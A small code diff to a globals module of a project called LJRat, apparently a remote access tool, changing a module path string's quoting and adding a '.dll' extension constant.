@@ -5,6 +5,7 @@ Module that establishes the global variables used throughout operation of LJRat 
 import queue
 from context import Rat_Ctx
 
-MODULE_PATH = 'bin/'
+MODULE_PATH = "bin/"
+DLL_EXT = ".dll"
 
 ctx = Rat_Ctx()
